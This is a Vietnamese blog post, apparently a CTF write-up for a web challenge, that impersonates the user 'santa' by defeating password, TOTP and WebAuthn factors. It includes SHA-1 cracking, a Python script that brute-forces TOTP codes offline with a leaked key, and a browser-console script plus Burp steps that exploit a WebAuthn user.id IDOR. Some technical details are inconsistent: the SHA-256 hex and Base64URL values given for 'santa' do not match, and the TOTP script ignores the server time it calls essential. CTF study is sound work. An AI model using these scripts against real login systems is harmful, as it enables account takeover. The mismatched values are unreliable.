---
layout: post
title: "Multifactorial - Silent Snow CTF"
categories: ctf
tags: [web, mfa, idor, webauthn, sha1]
date: 2026-01-04
permament_link: /writeups/silent-snow-ctf/multifactorial/
---

> [!NOTE]
> **Challenge Information**
> - **Event:** Silent Snow CTF
> - **Challenge Name:** Multifactorial
> - **Category:** Web Exploitation
> - **Points:** 190
> - **Solves:** 147
> - **Author:** thee2d

## Mục Tiêu Thử Thách

**Nhiệm vụ:** Mạo danh người dùng `santa` để xâm nhập vào hệ thống SOC (Security Operations Center).

Hệ thống bảo mật được thiết kế với 3 lớp xác thực (MFA) theo mô hình chuẩn:
1.  **Something you know:** Mật khẩu (Password).
2.  **Something you have:** Mã xác thực dùng một lần (TOTP).
3.  **Something you are:** Chìa khóa bảo mật (WebAuthn/Passkey).

Hãy cùng phân tích và bẻ khóa từng lớp bảo mật này.

<!-- more -->

---

## Giai đoạn 1: Something You Know (Mật khẩu)

### Phân tích

Bước đầu tiên là vượt qua lớp bảo mật mật khẩu. Khi kiểm tra mã nguồn (View Source) của trang đăng nhập, ta phát hiện một đoạn mã JavaScript bị làm mờ (obfuscated).

Jingle McSnark đã để lại một "Easter Egg" ngay trong đám mã hỗn loạn đó. Dưới đây là đoạn code thú vị tìm được:

```javascript
var _0x148159=['...','You\x27re\x20really\x20lucky!\x20Here\x27s\x20my\x20hash\x20as\x20a\x20reward.\x20bf33632dd9668787878890cb4fbb54261b6b7571',...];
// ...
Math[_0x2f6642(0x1e2)]()===0x0 && alert(_0x2f6642(0x1df));
```

![Obfuscated JavaScript Code](/assets/images/multifactorial-stage1.png)

Đoạn mã trên có nghĩa là: Nếu bạn cực kỳ may mắn (khi `Math.random() === 0`), trình duyệt sẽ hiện thông báo chứa mã băm (hash) này. Nhưng chúng ta không cần chờ vận may, chúng ta có thể đọc nó trực tiếp từ source code!

> *"You're really lucky! Here's my hash as a reward. bf33632dd9668787878890cb4fbb54261b6b7571"*

### Khai thác

Chúng ta có một chuỗi hash: `bf33632dd9668787878890cb4fbb54261b6b7571`.
- **Độ dài:** 40 ký tự hexadecimal.
- **Nhận định:** Khả năng cao đây là **SHA-1**.
![CrackStation Result](/assets/images/multifactorial-crackstation.png)
Sử dụng các công cụ tra cứu bảng cầu vồng trực tuyến (như CrackStation) hoặc tấn công brute-force cục bộ (nếu cần), ta nhanh chóng tìm ra giá trị gốc.
**Kết quả:** Mật khẩu là `northpole`.

---

## Giai đoạn 2: Something You Have (TOTP)

Giai đoạn này đòi hỏi sự hiểu biết sâu sắc về cách thức hoạt động của TOTP (Time-based One-Time Password) và các cơ chế bảo vệ trạng thái (stateful defense) của server.

### 1. Phân tích Chuyên Sâu

Sau khi nhập đúng mật khẩu, hệ thống yêu cầu mã TOTP 6 chữ số. Việc kiểm tra mã nguồn (Client-side) cho thấy một biến toàn cục thú vị:

```javascript
ORACLE_KEY = "17_w0Uld_83_V3Ry_fUNnY_1f_y0U_7H0u9H7_7H15_W45_4_Fl49"
```

Đây là một lỗi cấu hình nghiêm trọng: **Rò rỉ khóa bí mật (Secret Key)**. Tuy nhiên, việc khai thác không hề đơn giản do các cơ chế phòng thủ sau:

#### a. Cơ chế "Anti-Replay" và "Rate Limiting"
Hệ thống không chỉ kiểm tra tính đúng sai của mã mà còn quản lý trạng thái phiên làm việc:
-   **Anti-Replay:** Mỗi lần bạn nhập sai, server sẽ coi như mã OTP hiện tại (hoặc chu kỳ hiện tại) đã bị "bẩn" (invalidated).
-   **New HMAC Generation:** Ngay khi nhập sai, server trả về một `hmac` mới và `serverTime` mới. Nếu bạn cố gắng sử dụng lại thông tin cũ hoặc mã giải được từ giây trước, request sẽ bị từ chối ngay lập tức.

#### b. Sự khắt khe của "Window Size" (Cửa sổ thời gian)
Trong các triển khai TOTP thực tế (như Google Authenticator), server thường cho phép độ lệch ("Drift") khoảng ±1 chu kỳ (tổng cộng 90 giây) để bù trừ đỗ trễ mạng hoặc lệch đồng hồ.
Nhưng tại trạm an ninh Bắc Cực này:
-   **Strict Timing:** Độ lệch cho phép bằng **0**. Mã chỉ hợp lệ duy nhất trong cửa sổ 30 giây hiện tại.
-   **Server-side Time:** Thuật toán tính toán dựa hoàn toàn trên `serverTime`. Nếu đồng hồ máy tính của bạn lệch dù chỉ vài giây so với server, mã tạo ra sẽ vô hiệu.

### 2. Chiến Thuật Khai Thác: "Racing Against Time"

Brute-force trực tiếp (Online) là vô vọng do Rate Limiting. Chiến thuật duy nhất khả thi là **Brute-force Offline** kết hợp với thao tác tay cực nhanh (hoặc tự động hóa hoàn toàn).

**Quy trình tấn công:**
1.  **Recon:** Gửi một request sai để kích hoạt phản hồi chứa `hmac` và `serverTime`.
2.  **Offline Cracking:** Sử dụng script Python để tính toán lại mã TOTP từ không gian mẫu `000000-999999` sao cho khớp với `hmac` vừa nhận được.
3.  **Submission:** Gửi mã tìm được lên server ngay lập tức.

**Tại sao Burp Suite là "Vũ khí tối thượng"?**
Trong kịch bản này, độ trễ (latency) là kẻ thù. Dùng trình duyệt web thông thường sẽ quá chậm do phải tải UI, xử lý JavaScript và render.
-   **Burp Repeater:** Cho phép gửi request HTTP thô (Raw HTTP) ngay lập tức khi có mã.
-   **Burp Intruder:** Nếu cần, có thể cấu hình để tự động hóa việc gửi payload, giảm thiểu thời gian thao tác xuống mili-giây.

**Script giải mã Offline (Python):**

```python
import hashlib
import hmac

# Khóa bí mật bị rò rỉ từ Client-side
secret = b"17_w0Uld_83_V3Ry_fUNnY_1f_y0U_7H0u9H7_7H15_W45_4_Fl49"

# HMAC nhận được từ phản hồi của server (thay đổi mỗi lần request)
target_hmac = "..." 

print(f"[*] Cracking TOTP for HMAC: {target_hmac}")

# Vét cạn không gian mẫu 6 chữ số (000000 - 999999)
for i in range(1000000):
    code = f"{i:06d}"
    # Tính toán lại HMAC với thuật toán SHA-256 (dựa trên phân tích)
    calculated_hmac = hmac.new(secret, code.encode(), hashlib.sha256).hexdigest()
    
    if calculated_hmac == target_hmac:
        print(f"[+] FOUND VALID TOTP: {code}")
        break
```

![Debug Response in Burp Suite](/assets/images/3.png)

**Kết quả:** Với sự hỗ trợ của Burp Suite và script Python tối ưu, ta tìm được mã TOTP đúng và vượt qua lớp bảo mật thứ hai.

---

## Giai đoạn 3: Something You Are (WebAuthn/Passkey)

### 1. Phân tích: Lỗ hổng trong WebAuthn

Vấn đề cốt lõi nằm ở quy trình đăng ký: Khi bạn nhấn nút đăng ký, trình duyệt hỏi máy chủ "Tôi nên đăng ký như thế nào?" qua API `/options`. Máy chủ trả về một cấu hình JSON, trong đó quan trọng nhất là `user.id`.

Trong đoạn mã Client-side có dòng:
```javascript
publicKey.user.id = b64urlToBuf(publicKey.user.id);
```

Máy chủ gửi ID dạng Base64URL, và trình duyệt chuyển nó về dạng Binary để lưu vào thiết bị bảo mật (Authenticator).

**Lỗ hổng (IDOR):** Máy chủ chấp nhận bất kỳ `user.id` nào mà Client gửi lên trong quá trình đăng ký/xác thực mà không kiểm tra lại xem nó có khớp với session hiện tại hay không. Nếu ta thay đổi ID này thành mã băm của `santa` trước khi WebAuthn tạo Credential, ta sẽ tạo ra một chìa khóa "hợp pháp" cho tài khoản Santa.

### 2. Kế hoạch tác chiến

Gợi ý của Jingle: "Hãy thử tự tạo một userHandle cho santa" và "SHA-256 không phải lúc nào cũng ở dạng Hex".

Chúng ta cần mã băm SHA-256 của chuỗi `"santa"` ở dạng **Binary/Buffer** (để trình duyệt xử lý), chứ không phải chuỗi Hex thông thường.

**Giá trị mục tiêu cho "santa":**
-   **SHA-256 (Hex):** `e4bab05e049e418c664945d948f728c3104e1c251d5c22501258671675276367`
-   **SHA-256 (Base64URL):** `5LqwXgQnkGFhSUXZSUP3KMMQThwlHVwiUBJYZxZ1J2M`

### 3. Script Khai Thác (Console Injection)

Thay vì dùng giao diện web, ta mở **Console (F12)** và chạy đoạn script sau. Script này sẽ:
1.  Tính toán SHA-256 Buffer cho `"santa"`.
2.  Lấy options đăng ký từ server.
3.  **Ghi đè (Hook)** `publicKey.user.id` bằng hash của Santa.
4.  Hoàn tất quy trình đăng ký giả mạo.

```javascript
async function finalizeAttack() {
    const targetUser = "santa";
    console.log("🚀 Bắt đầu cuộc tấn công mạo danh Santa...");

    // 1. Tạo SHA-256 Buffer cho "santa"
    const encoder = new TextEncoder();
    const data = encoder.encode(targetUser);
    const hashBuffer = await crypto.subtle.digest('SHA-256', data);

    // 2. Lấy options từ máy chủ
    const optResp = await fetch("/api/webauthn/register/options", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name: "santa" }), // Gửi tên là santa
    });
    const optData = await optResp.json();
    const publicKey = optData.publicKey;

    // 3. CAN THIỆP: Ghi đè ID của server bằng ID của Santa
    // Đây chính là gói tin "mồi nhử" mà Jingle gửi xuống (thường là ID của hacker).
    // Ta thay nó bằng ID của Santa.
    publicKey.challenge = b64urlToBuf(publicKey.challenge);
    publicKey.user.id = hashBuffer; // "Chìa khóa" quyết định
    publicKey.user.name = "santa";
    publicKey.user.displayName = "Santa Claus";

    console.log("🔑 Đang tạo Passkey... Hãy xác nhận trên thiết bị của bạn!");

    // 4. Tạo Credential (Trình duyệt sẽ hiện popup yêu cầu vân tay/mã pin)
    const cred = await navigator.credentials.create({ publicKey });

    // 5. Gửi dữ liệu giả mạo lên Server để hoàn tất
    const payload = {
        name: "santa",
        id: cred.id,
        rawId: bufToB64url(cred.rawId),
        type: cred.type,
        response: {
            clientDataJSON: bufToB64url(cred.response.clientDataJSON),
            attestationObject: bufToB64url(cred.response.attestationObject),
        },
    };

    const verResp = await fetch("/api/webauthn/register/verify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
    });

    const result = await verResp.json();
    console.log("🏁 Kết quả từ Server:", result);

    if (verResp.ok) {
        alert("CHÚC MỪNG! Bạn đã là Santa Claus. Hãy tiến tới đăng nhập!");
        window.location.href = "/something-you-are";
    } else {
        console.error("Lỗi:", result.error);
    }
}

// Helper functions (thường có sẵn trong mã nguồn trang web, copy lại cho chắc)
function b64urlToBuf(b64url) {
    return Uint8Array.from(atob(b64url.replace(/-/g, "+").replace(/_/g, "/")), c => c.charCodeAt(0));
}
function bufToB64url(buf) {
    return btoa(String.fromCharCode(...new Uint8Array(buf))).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

// Chạy hàm
finalizeAttack();
```

**Kết quả:** Máy chủ nhận được credential mới, thấy `user.id` khớp với hash của Santa (do Client gửi lên và Server... tin luôn), nên đã liên kết thiết bị của hacker với tài khoản Santa. Chiến thắng!

### 4. Phương pháp thay thế: Burp Suite Interception

Nếu không quen dùng Console, bạn có thể dùng Burp Suite để đánh chặn và sửa gói tin trực tiếp ("Cách chuẩn").

**Các bước thực hiện:**

1.  **Cài đặt Intercept:** Bật Burp Suite, đảm bảo trình duyệt đi qua Proxy. Bật **Intercept is ON**.
2.  **Bắt gói tin Options:** Nhấn nút đăng ký trên web. Burp sẽ bắt request `POST /api/webauthn/register/options`. Nhấn **Forward**.
3.  **Chặn Response (Quan trọng):** Sau khi Forward request, nhấp chuột phải vào request đó trong Burp -> chọn **Do intercept -> Response to this request**.
4.  **Sửa dữ liệu:** Khi gói tin Response trả về (JSON chứa cấu hình), tìm dòng:
    `"id": "..." (ID hiện tại của hacker)`
5.  **Inject Santa ID:** Thay thế giá trị đó bằng chuỗi Base64URL của SHA-256("santa"):
    `5LqwXgQnkGFhSUXZSUP3KMMQThwlHVwiUBJYZxZ1J2M`
6.  **Forward:** Nhấn Forward để thả gói tin về trình duyệt.

Lúc này, trình duyệt sẽ nhận được ID đã bị chỉnh sửa, và popup tạo Passkey sẽ hiện ra cho tài khoản "Santa" (dù server ban đầu gửi ID khác).

---

## Kết Luận & Flag

Thử thách **Multifactorial** là một ví dụ điển hình cho nguyên tắc: **"Hệ thống bảo mật chỉ mạnh bằng mắt xích yếu nhất."**

- Dù sử dụng công nghệ tiên tiến như WebAuthn, việc thiếu kiểm soát dữ liệu đầu vào từ Client (Client-Side Trust) đã phá vỡ hoàn toàn tính toàn vẹn của hệ thống.
- Các lỗi sơ đẳng như rò rỉ khóa bí mật (Secret Key Leakage) và sử dụng thuật toán băm yếu (SHA-1) đóng vai trò đòn bẩy giúp kẻ tấn công leo thang dễ dàng.

> [!SUCCESS]
> **Flag:** `[Dán mã Flag bạn tìm được vào đây]`

---

## Bài Học Rút Ra

1.  **Không bao giờ tin tưởng Client:** Mọi dữ liệu định danh (như User ID trong WebAuthn) phải được kiểm soát chặt chẽ bởi Server (Session), không được phép nhận từ Client.
2.  **Quản lý khóa bí mật:** Không bao giờ hardcode khóa bí mật (Secret Keys) trong mã nguồn Frontend.
3.  **Tránh thuật toán cũ:** SHA-1 đã bị coi là không an toàn, hãy sử dụng SHA-256 hoặc mạnh hơn cho việc lưu trữ mật khẩu (kết hợp với Salt).

<div style="text-align: center; margin-top: 2rem;">
  <em>Chúc các bạn học tập tốt và hẹn gặp lại ở các thử thách sau!</em>
</div>
